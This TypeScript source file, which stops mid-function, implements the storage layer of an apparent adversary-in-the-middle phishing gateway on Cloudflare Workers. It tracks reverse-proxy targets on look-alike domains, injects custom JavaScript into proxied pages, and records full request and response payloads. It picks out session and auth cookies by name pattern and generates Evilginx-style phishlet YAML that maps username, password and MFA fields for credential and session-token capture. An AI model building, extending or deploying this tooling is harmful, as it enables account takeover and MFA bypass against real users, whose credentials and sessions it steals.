import { DurableObject } from "cloudflare:workers";

export type Item = {
  id: number;
  name: string;
  description: string;
  createdAt: number;
  updatedAt: number;
};

export type TrafficEntry = {
  id: number;
  ts: number;
  method: string;
  path: string;
  status: number;
  latencyMs: number;
  cache: string;
  ip: string;
  country: string;
  colo: string;
  proxy: string;
};

/** A single intercept capture — proxied request/response payload recorded when lab mode is on. */
export type InterceptCapture = {
  id: number;
  ts: number;
  slug: string;
  method: string;
  path: string;
  reqHeaders: string;
  reqBody: string;
  respStatus: number;
  respHeaders: string;
  respBody: string;
  host: string;
};

type InterceptRow = {
  id: number;
  ts: number;
  slug: string;
  method: string;
  path: string;
  req_headers: string;
  req_body: string;
  resp_status: number;
  resp_headers: string;
  resp_body: string;
  host: string;
};

type ConfigRow = {
  key: string;
  value: string;
};

/** Fields exposed by GET /api/config and editable via PUT /api/config. */
const CONFIG_FIELDS = [
  "ALLOWED_ORIGINS",
  "INTERCEPT_LAB_MODE",
  "INTERCEPT_ALLOWLIST",
  "INTERCEPT_BLOCKLIST",
  "INTERCEPT_TTL_SECONDS",
  "API_KEY",
  "CF_API_KEY",
  "CF_API_EMAIL",
  "CF_API_TOKEN",
  "PROXY_TARGET",
  "BASE_DOMAIN",
  "RESIDENTIAL_PROXY_POOL",
] as const;

type ConfigFields = (typeof CONFIG_FIELDS)[number];

type TrafficRow = {
  id: number;
  ts: number;
  method: string;
  path: string;
  status: number;
  latency_ms: number;
  cache: string;
  ip: string;
  country: string;
  colo: string;
  proxy: string;
};

/** A configured reverse-proxy target. The edge worker reads these live. */
export type Proxy = {
  id: number;
  slug: string;
  name: string;
  targetUrl: string;
  enabled: boolean;
  hits: number;
  /** A purchased Cloudflare domain allocated to route this target, e.g. "api.example.com". */
  proxyDomain: string;
  /** Whether intercept lab mode should capture payloads for this target. */
  interceptEnabled: boolean;
  /** Cloudflare zone ID where the proxy DNS record lives. */
  cfZoneId: string;
  /** Cloudflare DNS record ID for the allocated CNAME. */
  cfRecordId: string;
  /** Custom JavaScript snippet injected into proxied HTML pages. */
  injectJs: string;
  /** Whether the custom JS snippet should be injected. */
  injectJsEnabled: boolean;
  /** Auto-generated YAML phishlet config for this target. */
  phishlet: string;
  createdAt: number;
  updatedAt: number;
};

type ProxyRow = {
  id: number;
  slug: string;
  name: string;
  target_url: string;
  enabled: number;
  hits: number;
  proxy_domain: string;
  intercept_enabled: number;
  cf_zone_id: string;
  cf_record_id: string;
  inject_js: string;
  inject_js_enabled: number;
  phishlet: string;
  created_at: number;
  updated_at: number;
};

/** Number of most-recent traffic entries the analyser keeps in the ring buffer. */
const TRAFFIC_LIMIT = 200;

/** Number of most-recent intercept captures to retain per slug. */
const INTERCEPT_LIMIT = 500;

/** Default TTL for intercept captures in seconds (10 min). */
const INTERCEPT_DEFAULT_TTL = 600;

type ItemRow = {
  id: number;
  name: string;
  description: string;
  created_at: number;
  updated_at: number;
};

const STARTED_AT_KEY = "startedAt";

/** Known auth-token cookie name patterns — matched case-insensitively. */
const AUTH_TOKEN_PATTERNS = [
  /session/i, /auth/i, /token/i, /sid/i, /jwt/i, /access/i, /id_token/i,
  /refresh/i, /bearer/i, /oauth/i, /sso/i, /login/i, /sess/i, /xsrf/i,
  /csrf/i, /_csrf/i, /connect\.sid/i, /JSESSIONID/i, /PHPSESSID/i,
];

/** Returns true when a cookie name looks like an auth/session token. */
function isAuthTokenName(name: string): boolean {
  return AUTH_TOKEN_PATTERNS.some((p) => p.test(name));
}

/**
 * Identify the "main" domain from a list — the shortest non-www domain that
 * doesn't look like a CDN, analytics, or static asset host.
 */
function pickMainDomain(domains: string[]): string | null {
  const skipPatterns = [
    /^cdn\./i, /^static\./i, /^assets\./i, /^img\./i, /^images\./i,
    /^analytics\./i, /^metrics\./i, /^api\./i, /^ws\./i, /^sock\./i,
    /^fonts\./i, /^media\./i, /^files\./i, /^upload/i, /^store\./i,
  ];
  const candidates = domains
    .filter((d) => !skipPatterns.some((p) => p.test(d)))
    .sort((a, b) => a.length - b.length);
  // Prefer the shortest bare (non-www) domain.
  for (const d of candidates) {
    if (!d.startsWith("www.")) return d;
  }
  return candidates[0] ?? null;
}

/**
 * Build a production-grade Evilginx-style phishlet YAML from captured
 * reconnaissance data. Mirrors the sophistication of the PhishletForge
 * Python agent: smart domain analysis, auth-token cookie detection,
 * credential-to-key mapping, session/landing flags, login metadata,
 * and actionable notes for manual tuning.
 */
function buildPhishletYaml(
  proxy: Proxy,
  captured: {
    urls?: string[];
    cookies?: string[];
    formFields?: { name: string; type: string; id?: string; placeholder?: string }[];
    redirects?: string[];
    domains?: string[];
    /** Optional page title captured by the browser probe. */
    pageTitle?: string;
    /** Optional action-URL extracted from the login <form>. */
    formAction?: string;
    /** Optional form method extracted from the login <form>. */
    formMethod?: string;
  },
): string {
  const target = new URL(proxy.targetUrl);
  const targetHost = target.hostname;

  // ── domains ──────────────────────────────────────────────────────────
  const domains = captured.domains?.length
    ? [...new Set(captured.domains.map((d) => d.toLowerCase().trim()).filter(Boolean))]
    : [targetHost];
  const mainDomain = pickMainDomain(domains) ?? targetHost.replace(/^www\./, "");

  // ── proxy_hosts (session flag on the landing domain only) ────────────
  const proxyHosts = domains.slice(0, 8).map((domain, index) => {
    const isLanding = index === 0;
    const bare = domain.replace(/^www\./, "");
    const phishSub = isLanding ? "login" : domain.split(".")[0].slice(0, 10);
    const origSub = domain.startsWith("www.") ? "www" : domain.split(".")[0];
    const isMain = bare === mainDomain;
    return [
      `    - phish_sub: '${phishSub}'`,
      `      orig_sub: '${origSub}'`,
      `      domain: '${bare}'`,
      `      session: ${isLanding}`,
      `      is_landing: ${isLanding}`,
    ].join("\n");
  }).join("\n");

  // ── landing_path ─────────────────────────────────────────────────────
  const landingCandidates = [
    ...(captured.redirects ?? []),
    ...(captured.urls ?? []),
    proxy.targetUrl,
  ].filter(Boolean).slice(0, 6);
  const landingPath = landingCandidates
    .map((u) => `    - '${u}'`)
    .join("\n");

  // ── credentials — classify form fields into username / password / mfa ──
  const fields = captured.formFields ?? [];

  const isUsername = (f: { name: string; type: string; id?: string; placeholder?: string }): boolean => {
    const key = (f.name || f.id || f.placeholder || "").toLowerCase();
    return /^(user|email|login|username|account|member|customer|handle|nick)|\.(id|name)$/i.test(key) &&
      !/pass|pwd|current|old|pin|otp|mfa|token|code|verify/i.test(key) &&
      f.type !== "password";
  };

  const isPassword = (f: { name: string; type: string; id?: string; placeholder?: string }): boolean => {
    const key = (f.name || f.id || f.placeholder || "").toLowerCase();
    return f.type === "password" || /pass|pwd|password|secret/i.test(key);
  };

  const isMfa = (f: { name: string; type: string; id?: string; placeholder?: string }): boolean => {
    const key = (f.name || f.id || f.placeholder || "").toLowerCase();
    return /otp|mfa|2fa|totp|code|token|verify|one.?time|auth.?code/i.test(key);
  };

  const usernameLines = fields
    .filter(isUsername)
    .map((f) => `    - key: '${f.name || f.id || "username"}'`)
    .join("\n");
  const passwordLines = fields
    .filter(isPassword)
    .map((f) => `    - key: '${f.name || f.id || "password"}'`)
    .join("\n");
  const mfaLines = fields
    .filter(isMfa)
    .map((f) => `    - key: '${f.name || f.id || "otp"}'`)
    .join("\n");

  const credentialBlocks: string[] = [];
  if (usernameLines) credentialBlocks.push(usernameLines);
  if (passwordLines) credentialBlocks.push(passwordLines);
  if (mfaLines) credentialBlocks.push(mfaLines);
  const credentialsBlock = credentialBlocks.length > 0
    ? credentialBlocks.join("\n")
    : `    - key: 'username'\n    - key: 'password'`;

  // ── auth_tokens — detect session/auth cookies, not all cookies ───────
  const cookieNames = captured.cookies ?? [];
  const authCookieNames = cookieNames.filter(isAuthTokenName);
  const authTokenBlock = authCookieNames.length > 0
    ? authCookieNames
        .map((c) => `    - domain: '${mainDomain}'\n      name: '${c}'`)
        .join("\n")
    : `    - domain: '${mainDomain}'\n      name: 'session'`;

  // ── sub_filters — placeholder with guidance ──────────────────────────
  const subFiltersNote = [
    `    # --- MANUAL REVIEW REQUIRED ---`,
    `    # Add domain rewrite rules here so absolute URLs in HTML/JS are`,
    `    # rewritten to point through the proxy.  Common patterns:`,
    `    #   'https://${mainDomain}'  ->  'https://{hostname}'`,
    `    #   'https://www.${mainDomain}'  ->  'https://{hostname}'`,
  ];

  // ── login section ────────────────────────────────────────────────────
  const formAction = captured.formAction ?? fields.find((f) => f.name === "" || !f.name)?.["id"] ?? "";
  const formMethod = captured.formMethod ?? "post";
  const loginPath = (() => {
    try { return new URL(proxy.targetUrl).pathname || "/"; }
    catch { return "/"; }
  })();

  // ── assemble YAML ────────────────────────────────────────────────────
  const now = new Date().toISOString();
  const yaml = [
    `# =============================================================================`,
    `#  Phishlet: ${proxy.name}`,
    `#  Generated: ${now}`,
    `#  Target: ${proxy.targetUrl}`,
    `#  Agent: edge-gateway phishlet-forge (v2)`,
    `#`,
    `#  Auto-generated base config — ~80 % complete.`,
    `#  Review EVERY section before use.  Complex auth flows (OAuth, SAML,`,
    `#  WebAuthn, multi-step MFA) always require manual tuning.`,
    `# =============================================================================`,
    ``,
    `name: '${proxy.name.replace(/'/g, "''")}'`,
    `author: 'edge-gateway'`,
    `min_ver: '3.0.0-dev'`,
    ``,
    `proxy_hosts:`,
    proxyHosts,
    ``,
    `sub_filters:`,
    ...subFiltersNote,
    ``,
    `auth_tokens:`,
    authTokenBlock,
    ``,
    `credentials:`,
    credentialsBlock,
    ``,
    `login:`,
    `    domain: '${mainDomain}'`,
    `    path: '${loginPath}'`,
    `    origin: '${proxy.targetUrl}'`,
    `    action_path: '${formAction}'`,
    `    method: '${formMethod}'`,
    ``,
    `landing_path:`,
    landingPath,
    ``,
    `# ── Recon metadata (auto-generated) ──`,
    `generated_at: '${now}'`,
    `page_title: '${(captured.pageTitle ?? "").replace(/'/g, "''")}'`,
    `domains_observed: ${domains.length}`,
    `cookies_total: ${cookieNames.length}`,
    `auth_cookies_detected: ${authCookieNames.length}`,
    `forms_found: ${fields.length > 0 ? 1 : 0}`,
    `redirects_observed: ${(captured.redirects ?? []).length}`,
    ``,
    `# ── Raw captured data (for reference) ──`,
    `raw_domains:`,
    ...domains.map((d) => `    - '${d}'`),
    `raw_auth_cookies:`,
    ...authCookieNames.map((c) => `    - '${c}'`),
  ].join("\n");

  return yaml;
}

/** Wrap a SQL operation so errors produce a structured 500 instead of crashing the DO. */
function safeSql<T>(fn: () => T): { ok: true; value: T } | { ok: false; error: string } {
  try {
    return { ok: true, value: fn() };
  } catch (err: unknown) {
    const message = err instanceof Error ? err.message : String(err);
    return { ok: false, error: message };
  }
}

/**
 * ItemsStore is a single Durable Object instance (keyed "global") that owns
 * the Items table plus the gateway's boot timestamp used to compute uptime.
 */
export class ItemsStore extends DurableObject {
  private startedAt: number;
  private listCache: { body: string; expires: number } | null = null;

  constructor(ctx: DurableObjectState, env: unknown) {
    super(ctx, env);
    this.ctx.storage.sql.exec(`
      CREATE TABLE IF NOT EXISTS items (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        name TEXT NOT NULL,
        description TEXT NOT NULL DEFAULT '',
        created_at INTEGER NOT NULL,
        updated_at INTEGER NOT NULL
      )
    `);
    this.ctx.storage.sql.exec(`
      CREATE TABLE IF NOT EXISTS rate_hits (
        ip TEXT NOT NULL,
        ts INTEGER NOT NULL
      )
    `);
    this.ctx.storage.sql.exec(`
      CREATE TABLE IF NOT EXISTS traffic (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        ts INTEGER NOT NULL,
        method TEXT NOT NULL,
        path TEXT NOT NULL,
        status INTEGER NOT NULL,
        latency_ms INTEGER NOT NULL,
        cache TEXT NOT NULL DEFAULT '',
        ip TEXT NOT NULL DEFAULT '',
        country TEXT NOT NULL DEFAULT '',
        colo TEXT NOT NULL DEFAULT '',
        proxy TEXT NOT NULL DEFAULT ''
      )
    `);
    // Migration for stores created before the proxy column existed.
    try {
      this.ctx.storage.sql.exec(
        "ALTER TABLE traffic ADD COLUMN proxy TEXT NOT NULL DEFAULT ''",
      );
    } catch {
      // Column already exists — nothing to do.
    }
    this.ctx.storage.sql.exec(`
      CREATE TABLE IF NOT EXISTS proxies (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        slug TEXT NOT NULL UNIQUE,
        name TEXT NOT NULL,
        target_url TEXT NOT NULL,
        enabled INTEGER NOT NULL DEFAULT 1,
        hits INTEGER NOT NULL DEFAULT 0,
        proxy_domain TEXT NOT NULL DEFAULT '',
        created_at INTEGER NOT NULL,
        updated_at INTEGER NOT NULL
      )
    `);
    // Migration for stores created before the proxy_domain column existed.
    try {
      this.ctx.storage.sql.exec(
        "ALTER TABLE proxies ADD COLUMN proxy_domain TEXT NOT NULL DEFAULT ''",
      );
    } catch {
      // Column already exists — nothing to do.
    }
    // Migration: intercept_enabled flag on proxies.
    try {
      this.ctx.storage.sql.exec(
        "ALTER TABLE proxies ADD COLUMN intercept_enabled INTEGER NOT NULL DEFAULT 0",
      );
    } catch {
      // Column already exists.
    }
    // Migration: Cloudflare record tracking for auto-cleanup on delete.
    try {
      this.ctx.storage.sql.exec(
        "ALTER TABLE proxies ADD COLUMN cf_zone_id TEXT NOT NULL DEFAULT ''",
      );
    } catch {
      // Column already exists.
    }
    try {
      this.ctx.storage.sql.exec(
        "ALTER TABLE proxies ADD COLUMN cf_record_id TEXT NOT NULL DEFAULT ''",
      );
    } catch {
      // Column already exists.
    }
    // Migration: per-proxy JavaScript injection.
    try {
      this.ctx.storage.sql.exec(
        "ALTER TABLE proxies ADD COLUMN inject_js TEXT NOT NULL DEFAULT ''",
      );
    } catch {
      // Column already exists.
    }
    try {
      this.ctx.storage.sql.exec(
        "ALTER TABLE proxies ADD COLUMN inject_js_enabled INTEGER NOT NULL DEFAULT 0",
      );
    } catch {
      // Column already exists.
    }
    // Migration: per-proxy phishlet YAML config.
    try {
      this.ctx.storage.sql.exec(
        "ALTER TABLE proxies ADD COLUMN phishlet TEXT NOT NULL DEFAULT ''",
      );
    } catch {
      // Column already exists.
    }
    this.ctx.storage.sql.exec(`
      CREATE TABLE IF NOT EXISTS intercept_captures (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        ts INTEGER NOT NULL,
        slug TEXT NOT NULL,
        method TEXT NOT NULL,
        path TEXT NOT NULL,
        req_headers TEXT NOT NULL DEFAULT '',
        req_body TEXT NOT NULL DEFAULT '',
        resp_status INTEGER NOT NULL DEFAULT 0,
        resp_headers TEXT NOT NULL DEFAULT '',
        resp_body TEXT NOT NULL DEFAULT '',
        host TEXT NOT NULL DEFAULT ''
      )
    `);
    this.ctx.storage.sql.exec(`
      CREATE TABLE IF NOT EXISTS worker_config (
        key TEXT PRIMARY KEY,
        value TEXT NOT NULL DEFAULT ''
      )
    `);
    this.startedAt = Date.now();
  }

  /**
   * Sliding-window per-IP rate limit. Returns the headers describing the
   * client's current budget plus whether the request is allowed.
   */
  private checkRateLimit(
    ip: string,
    limit: number,
    windowSeconds: number,
  ): { allowed: boolean; remaining: number; reset: number } {
    const now = Date.now();
    const windowStart = now - windowSeconds * 1000;
    safeSql(() => {
      this.ctx.storage.sql.exec("DELETE FROM rate_hits WHERE ts < ?", windowStart);
    });
    const usedResult = safeSql(() =>
      this.ctx.storage.sql
        .exec<{ n: number }>("SELECT COUNT(*) AS n FROM rate_hits WHERE ip = ?", ip)
        .one().n,
    );
    const used = usedResult.ok ? usedResult.value : limit;
    const reset = Math.ceil((now + windowSeconds * 1000) / 1000);
    if (used >= limit) {
      return { allowed: false, remaining: 0, reset };
    }
    safeSql(() => {
      this.ctx.storage.sql.exec("INSERT INTO rate_hits (ip, ts) VALUES (?, ?)", ip, now);
    });
    return { allowed: true, remaining: Math.max(0, limit - used - 1), reset };
  }

  private async ensureStartedAt(): Promise<number> {
    const stored = await this.ctx.storage.get<number>(STARTED_AT_KEY);
    if (stored) {
      this.startedAt = stored;
      return stored;
    }
    await this.ctx.storage.put(STARTED_AT_KEY, this.startedAt);
    return this.startedAt;
  }

  /** Record an intercept capture — request + response payloads for a proxied target. */
  private recordIntercept(entry: Omit<InterceptCapture, "id">): void {
    safeSql(() => {
      this.ctx.storage.sql.exec(
        "INSERT INTO intercept_captures (ts, slug, method, path, req_headers, req_body, resp_status, resp_headers, resp_body, host) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
        entry.ts,
        entry.slug,
        entry.method,
        entry.path,
        entry.reqHeaders,
        entry.reqBody,
        entry.respStatus,
        entry.respHeaders,
        entry.respBody,
        entry.host,
      );
    });
    safeSql(() => {
      this.ctx.storage.sql.exec(
        "DELETE FROM intercept_captures WHERE id NOT IN (SELECT id FROM intercept_captures ORDER BY id DESC LIMIT ?)",
        INTERCEPT_LIMIT,
      );
    });
  }

  /** Purge captures older than `ttlSeconds` across all slugs. */
  private purgeExpiredIntercepts(ttlSeconds: number): void {
    const cutoff = Date.now() - ttlSeconds * 1000;
    safeSql(() => {
      this.ctx.storage.sql.exec("DELETE FROM intercept_captures WHERE ts < ?", cutoff);
    });
  }

  private listIntercepts(): InterceptCapture[] {
    const result = safeSql(() =>
      this.ctx.storage.sql
        .exec<InterceptRow>("SELECT * FROM intercept_captures ORDER BY id DESC LIMIT ?", INTERCEPT_LIMIT)
        .toArray()
        .map((row) => ({
          id: row.id,
          ts: row.ts,
          slug: row.slug,
          method: row.method,
          path: row.path,
          reqHeaders: row.req_headers,
          reqBody: row.req_body,
          respStatus: row.resp_status,
          respHeaders: row.resp_headers,
          respBody: row.resp_body,
          host: row.host,
        })),
    );
    return result.ok ? result.value : [];
  }

  private clearIntercepts(): void {
    safeSql(() => {
      this.ctx.storage.sql.exec("DELETE FROM intercept_captures");
    });
  }

  private listInterceptsForSlug(slug: string): InterceptCapture[] {
    const result = safeSql(() =>
      this.ctx.storage.sql
        .exec<InterceptRow>(
          "SELECT * FROM intercept_captures WHERE slug = ? ORDER BY id DESC LIMIT ?",
          slug,
          INTERCEPT_LIMIT,
        )
        .toArray()
        .map((row) => ({
          id: row.id,
          ts: row.ts,
          slug: row.slug,
          method: row.method,
          path: row.path,
          reqHeaders: row.req_headers,
          reqBody: row.req_body,
          respStatus: row.resp_status,
          respHeaders: row.resp_headers,
          respBody: row.resp_body,
          host: row.host,
        })),
    );
    return result.ok ? result.value : [];
  }

  /** Purge all intercept captures for a given proxy slug (cascade cleanup). */
  private clearInterceptsForSlug(slug: string): void {
    safeSql(() => {
      this.ctx.storage.sql.exec(
        "DELETE FROM intercept_captures WHERE slug = ?",
        slug,
      );
    });
  }

  /**
   * Append a traffic entry captured by the gateway interceptor, then trim the
   * ring buffer to the most recent TRAFFIC_LIMIT rows.
   */
  private recordTraffic(entry: Omit<TrafficEntry, "id">): void {
    safeSql(() => {
      this.ctx.storage.sql.exec(
        "INSERT INTO traffic (ts, method, path, status, latency_ms, cache, ip, country, colo, proxy) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
        entry.ts,
        entry.method,
        entry.path,
        entry.status,
        entry.latencyMs,
        entry.cache,
        entry.ip,
        entry.country,
        entry.colo,
        entry.proxy ?? "",
      );
    });
    safeSql(() => {
      this.ctx.storage.sql.exec(
        "DELETE FROM traffic WHERE id NOT IN (SELECT id FROM traffic ORDER BY id DESC LIMIT ?)",
        TRAFFIC_LIMIT,
      );
    });
  }

  private listTraffic(): TrafficEntry[] {
    const result = safeSql(() =>
      this.ctx.storage.sql
        .exec<TrafficRow>("SELECT * FROM traffic ORDER BY id DESC LIMIT ?", TRAFFIC_LIMIT)
        .toArray()
        .map((row) => ({
          id: row.id,
          ts: row.ts,
          method: row.method,
          path: row.path,
          status: row.status,
          latencyMs: row.latency_ms,
          cache: row.cache,
          ip: row.ip,
          country: row.country,
          colo: row.colo,
          proxy: row.proxy ?? "",
        })),
    );
    return result.ok ? result.value : [];
  }

  // --- Worker config --------------------------------------------------

  private getConfig(): Record<string, string> {
    const result = safeSql(() => {
      const rows = this.ctx.storage.sql
        .exec<ConfigRow>("SELECT key, value FROM worker_config")
        .toArray();
      const map: Record<string, string> = {};
      for (const row of rows) map[row.key] = row.value;
      return map;
    });
    return result.ok ? result.value : {};
  }

  private setConfig(entries: Record<string, string>): void {
    safeSql(() => {
      for (const [key, value] of Object.entries(entries)) {
        if (!(CONFIG_FIELDS as readonly string[]).includes(key)) continue;
        this.ctx.storage.sql.exec(
          "INSERT INTO worker_config (key, value) VALUES (?, ?) ON CONFLICT(key) DO UPDATE SET value = excluded.value",
          key,
          value,
        );
      }
    });
  }

  private clearConfig(): void {
    safeSql(() => {
      this.ctx.storage.sql.exec("DELETE FROM worker_config");
    });
  }

  // --- Proxy targets ---------------------------------------------------

  private toProxy(row: ProxyRow): Proxy {
    return {
      id: row.id,
      slug: row.slug,
      name: row.name,
      targetUrl: row.target_url,
      enabled: row.enabled === 1,
      hits: row.hits,
      proxyDomain: row.proxy_domain ?? "",
      interceptEnabled: row.intercept_enabled === 1,
      cfZoneId: row.cf_zone_id ?? "",
      cfRecordId: row.cf_record_id ?? "",
      injectJs: row.inject_js ?? "",
      injectJsEnabled: row.inject_js_enabled === 1,
      phishlet: row.phishlet ?? "",
      createdAt: row.created_at,
      updatedAt: row.updated_at,
    };
  }

  /** Set (or clear) the allocated proxy domain for a target by id, including CF record tracking. */
  private setProxyDomain(
    id: number,
    proxyDomain: string,
    cfZoneId?: string,
    cfRecordId?: string,
  ): Proxy | null {
    const existing = this.findProxy(id);
    if (!existing) return null;
    safeSql(() => {
      this.ctx.storage.sql.exec(
        "UPDATE proxies SET proxy_domain = ?, cf_zone_id = ?, cf_record_id = ?, updated_at = ? WHERE id = ?",
        proxyDomain,
        cfZoneId ?? "",
        cfRecordId ?? "",
        Date.now(),
        id,
      );
    });
    return this.findProxy(id);
  }

  private listProxies(): Proxy[] {
    const result = safeSql(() =>
      this.ctx.storage.sql
        .exec<ProxyRow>("SELECT * FROM proxies ORDER BY created_at DESC")
        .toArray()
        .map((row) => this.toProxy(row)),
    );
    return result.ok ? result.value : [];
  }

  private findProxy(id: number): Proxy | null {
    const result = safeSql(() => {
      const rows = this.ctx.storage.sql
        .exec<ProxyRow>("SELECT * FROM proxies WHERE id = ?", id)
        .toArray();
      return rows.length > 0 ? this.toProxy(rows[0]) : null;
    });
    return result.ok ? result.value : null;
  }

  private findProxyBySlug(slug: string): Proxy | null {
    const result = safeSql(() => {
      const rows = this.ctx.storage.sql
        .exec<ProxyRow>("SELECT * FROM proxies WHERE slug = ?", slug)
        .toArray();
      return rows.length > 0 ? this.toProxy(rows[0]) : null;
    });
    return result.ok ? result.value : null;
  }

  /** Look up a proxy by its allocated proxyDomain (hostname), with wildcard support. */
  private findProxyByDomain(hostname: string): Proxy | null {
    const result = safeSql(() => {
      // First try exact match.
      const exact = this.ctx.storage.sql
        .exec<ProxyRow>("SELECT * FROM proxies WHERE proxy_domain = ? AND proxy_domain != ''", hostname)
        .toArray();
      if (exact.length > 0) return this.toProxy(exact[0]);

      // Try wildcard: e.g. "app.example.com" matches proxyDomain "*.example.com".
      const allDomains = this.ctx.storage.sql
        .exec<ProxyRow>("SELECT * FROM proxies WHERE proxy_domain != '' AND proxy_domain LIKE '*%'")
        .toArray();
      for (const row of allDomains) {
        const pattern = row.proxy_domain;
        if (pattern.startsWith("*.")) {
          const suffix = pattern.slice(2).replace(/[.+?^${}()|[\]\\]/g, "\\$&");
          const regex = new RegExp("^[^.]+\\." + suffix + "$", "i");
          if (regex.test(hostname)) return this.toProxy(row);
        }
      }
      return null;
    });
    return result.ok ? result.value : null;
  }

  /** Build a URL-safe, unique slug from a display name (or target host). */
  private uniqueSlug(base: string): string {
    const root =
      base
        .toLowerCase()
        .replace(/^https?:\/\//, "")
        .replace(/[^a-z0-9]+/g, "-")
        .replace(/^-+|-+$/g, "")
        .slice(0, 32) || "target";
    let slug = root;
    let n = 1;
    while (this.findProxyBySlug(slug)) {
      n += 1;
      slug = `${root}-${n}`;
    }
    return slug;
  }

  private incrementProxyHits(slug: string): void {
    safeSql(() => {
      this.ctx.storage.sql.exec(
        "UPDATE proxies SET hits = hits + 1 WHERE slug = ?",
        slug,
      );
    });
  }

  override async fetch(request: Request): Promise<Response> {
    const url = new URL(request.url);
    const path = url.pathname;
    const method = request.method;

    // Internal interceptor write — never counts against the client rate budget.
    if (path === "/__traffic" && method === "POST") {
      const entry = (await this.safeJson(request)) as Omit<
        TrafficEntry,
        "id"
      > | null;
      if (entry) this.recordTraffic(entry);
      return new Response(null, { status: 204 });
    }

    // Internal intercept capture write — fire-and-forget from the Worker proxy.
    if (path === "/__intercept" && method === "POST") {
      const entry = (await this.safeJson(request)) as Omit<
        InterceptCapture,
        "id"
      > | null;
      if (entry) this.recordIntercept(entry);
      return new Response(null, { status: 204 });
    }

    // Internal proxy resolution — used by the worker before rate limiting.
    if (path === "/__proxy" && method === "GET") {
      const slug = url.searchParams.get("slug") ?? "";
      const proxy = this.findProxyBySlug(slug);
      if (!proxy) {
        return Response.json({ success: false }, { status: 404 });
      }
      return Response.json({ success: true, data: proxy });
    }

    // Internal proxy resolution by id — used for DNS cleanup on delete.
    if (path === "/__proxy-by-id" && method === "GET") {
      const id = Number(url.searchParams.get("id") ?? 0);
      const proxy = this.findProxy(id);
      if (!proxy) {
        return Response.json({ success: false }, { status: 404 });
      }
      return Response.json({ success: true, data: proxy });
    }

    // Internal hit counter bump for a proxy target.
    if (path === "/__proxy-hit" && method === "POST") {
      const body = (await this.safeJson(request)) as { slug?: string } | null;
      if (body?.slug) this.incrementProxyHits(body.slug);
      return new Response(null, { status: 204 });
    }

    // Internal: cascade-clear intercept captures for a given proxy slug.
    if (path === "/__intercept-clear" && method === "POST") {
      const body = (await this.safeJson(request)) as { slug?: string } | null;
      if (body?.slug) this.clearInterceptsForSlug(body.slug);
      return new Response(null, { status: 204 });
    }

    // Internal: resolve proxy by allocated domain hostname (wildcard routing).
    if (path === "/__proxy-by-domain" && method === "GET") {
      const host = (url.searchParams.get("host") ?? "").toLowerCase().trim();
      if (!host) {
        return Response.json({ success: false }, { status: 400 });
      }
      const proxy = this.findProxyByDomain(host);
      if (!proxy) {
        return Response.json({ success: false }, { status: 404 });
      }
      return Response.json({ success: true, data: proxy });
    }

    // Internal: allocate / clear an allocated proxy domain for a target.
    if (path === "/__proxy-domain" && method === "POST") {
      const body = (await this.safeJson(request)) as {
        id?: number;
        proxyDomain?: string;
        cfZoneId?: string;
        cfRecordId?: string;
      } | null;
      if (!body?.id) {
        return Response.json({ success: false }, { status: 400 });
      }
      const updated = this.setProxyDomain(
        body.id,
        (body.proxyDomain ?? "").trim(),
        body.cfZoneId,
        body.cfRecordId,
      );
      if (!updated) {
        return Response.json({ success: false }, { status: 404 });
      }
      return Response.json({ success: true, data: updated });
    }

    const ip = request.headers.get("X-Client-IP") ?? "anonymous";
    const limit = Number(request.headers.get("X-Rate-Limit") ?? "100");
    const windowSeconds = Number(request.headers.get("X-Rate-Window") ?? "60");
    const rl = this.checkRateLimit(ip, limit, windowSeconds);
    const rlHeaders: Record<string, string> = {
      "X-RateLimit-Limit": String(limit),
      "X-RateLimit-Remaining": String(rl.remaining),
      "X-RateLimit-Reset": String(rl.reset),
    };
    if (!rl.allowed) {
      return Response.json(
        { success: false, error: "rate limit exceeded" },
        {
          status: 429,
          headers: { ...rlHeaders, "Retry-After": String(windowSeconds) },
        },
      );
    }
    const withRl = (response: Response): Response => {
      for (const [k, v] of Object.entries(rlHeaders)) response.headers.set(k, v);
      return response;
    };

    if (path === "/health") {
      const startedAt = await this.ensureStartedAt();
      const counts = safeSql(() => ({
        items: this.ctx.storage.sql
          .exec<{ n: number }>("SELECT COUNT(*) AS n FROM items")
          .one().n,
        proxies: this.ctx.storage.sql
          .exec<{ n: number }>("SELECT COUNT(*) AS n FROM proxies")
          .one().n,
        intercepts: this.ctx.storage.sql
          .exec<{ n: number }>("SELECT COUNT(*) AS n FROM intercept_captures")
          .one().n,
        traffic: this.ctx.storage.sql
          .exec<{ n: number }>("SELECT COUNT(*) AS n FROM traffic")
          .one().n,
      }));
      const config = safeSql(() => this.getConfig());
      return withRl(
        Response.json({
          status: "ok",
          timestamp: new Date().toISOString(),
          uptime: Math.round((Date.now() - startedAt) / 1000),
          itemCount: counts.ok ? counts.value.items : 0,
          proxyCount: counts.ok ? counts.value.proxies : 0,
          interceptCount: counts.ok ? counts.value.intercepts : 0,
          trafficCount: counts.ok ? counts.value.traffic : 0,
          interceptLabMode: config.ok
            ? (config.value.INTERCEPT_LAB_MODE ?? "false")
            : "false",
          region: "edge",
        }),
      );
    }

    if (path === "/api/intercepts" && method === "GET") {
      const ttlSeconds = Number(request.headers.get("X-Intercept-TTL") ?? INTERCEPT_DEFAULT_TTL);
      this.purgeExpiredIntercepts(ttlSeconds);
      const captures = this.listIntercepts();
      return withRl(
        Response.json({ success: true, data: captures, count: captures.length }),
      );
    }

    if (path === "/api/intercepts" && method === "DELETE") {
      this.clearIntercepts();
      return withRl(Response.json({ success: true, data: null }));
    }

    if (path === "/api/traffic" && method === "GET") {
      const entries = this.listTraffic();
      const total = entries.length;
      const avgLatency =
        total > 0
          ? Math.round(entries.reduce((sum, e) => sum + e.latencyMs, 0) / total)
          : 0;
      const errorCount = entries.filter((e) => e.status >= 400).length;
      const cacheHits = entries.filter((e) => e.cache === "HIT").length;
      return withRl(
        Response.json({
          success: true,
          data: entries,
          stats: { total, avgLatency, errorCount, cacheHits },
        }),
      );
    }

    if (path === "/api/proxies" && method === "GET") {
      return withRl(
        Response.json({ success: true, data: this.listProxies() }),
      );
    }

    if (path === "/api/proxies" && method === "POST") {
      const body = (await this.safeJson(request)) as Partial<Proxy> | null;
      const targetUrl = (body?.targetUrl ?? "").toString().trim();
      const name = (body?.name ?? "").toString().trim();
      let parsed: URL;
      try {
